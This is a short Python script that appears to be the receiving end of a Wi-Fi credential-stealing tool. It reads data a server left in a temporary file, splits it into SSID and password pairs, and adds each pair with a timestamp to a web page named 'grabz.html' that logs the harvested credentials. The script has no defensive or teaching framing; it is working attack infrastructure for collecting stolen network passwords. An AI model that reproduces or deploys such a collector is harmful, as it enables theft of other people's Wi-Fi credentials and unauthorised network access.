#!/usr/bin/python3
from time import strftime, localtime
from os import remove

# read data from tmp.txt left by the server and delete tmpfile
def read_data():
    with open("tmp.txt", 'r') as fp:
        data = fp.read()
    remove("tmp.txt")
    return data


# filter and clean data for writting
def filter_data(raw_data):
    coupled_data = list()
    wifi_ssd = ""
    wifi_passwd = ""
    raw_data = raw_data[6:]# remove ?data=
    # then for each will be wifi_ssd=$$&wifi_pass=$$&wifi_ssd=$$&wifi_pass=$$
    i = 0
    for param in raw_data.split("&"):
        # 0, 2 and all pairs are wifi_ssd and impairs are wifi_passwd
        p = param.split("=")[1]
        if i % 2 == 0:
            wifi_ssd = p
        else:
            wifi_passwd = p
            coupled_data.append([wifi_ssd, wifi_passwd])
        i += 1
    return coupled_data
            

# write new data to write to markdown page
def write_grab(wifi_ssd, wifi_password):
    # create timestamp for log
    curr_time = localtime()
    curr_clock = strftime("%d/%m/%Y @ %H:%M:%S", curr_time)
    with open("webroot/grabz.html", 'r') as fp:
        page = fp.read()
    new_page = ""
    fresh = True
    # copy paste line by line from the original file to memory
    # when finds the first entry read new entry to memory
    # effectively placing it before the first entry and
    # then continue the copy paste process until EOF
    # then overwrite all of this in the original file
    for line in page.split("\n"):
        if "<p>" in line and fresh:
            fresh = False
            tabs = line.split("<")[0]
            grab = f"<p>{curr_clock} - {wifi_ssd} : {wifi_password}</p>\n"
            new_page = new_page + tabs + grab
        new_page = new_page + line + "\n"
    with open("webroot/grabz.html", 'w') as fp:
        fp.write(new_page)


if __name__ == '__main__':
    raw_data = read_data()
    coupled_data = filter_data(raw_data)
    for pair in coupled_data:
        write_grab(pair[0], pair[1])
    